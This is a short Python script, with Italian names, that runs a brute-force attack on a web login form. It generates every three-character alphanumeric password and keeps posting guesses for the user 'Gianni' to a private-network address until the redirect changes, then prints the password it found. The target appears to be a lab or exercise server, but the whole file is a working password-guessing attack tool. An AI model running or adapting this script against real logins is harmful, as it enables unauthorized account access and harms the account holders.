import socket as sck
import requests
import string
from urllib import request
import random

INDIRIZZO="http://192.168.0.137:5000/"

def main():
    un="Gianni"
    car=string.ascii_letters+string.digits
    print(car)
    passlist=[]
    for k in car:
        passBrut=k
        for i in car:
            passBrut=passBrut+i
            for j in car:
                passBrut=passBrut+j
                passlist.append(passBrut)
                passBrut=passBrut[:-1]
            passBrut=passBrut[:-1]
    while True:
        password=passlist[random.randint(0,len(passlist)-1)]
        r = requests.post(INDIRIZZO, data={"username":un, "password":password,"login":"Login"})
        print(password,r.url)
        if(r.url!=INDIRIZZO):
            break
        else:
            passlist.remove(password)
    print(f"La password è: {password}")

if __name__=="__main__":
    main()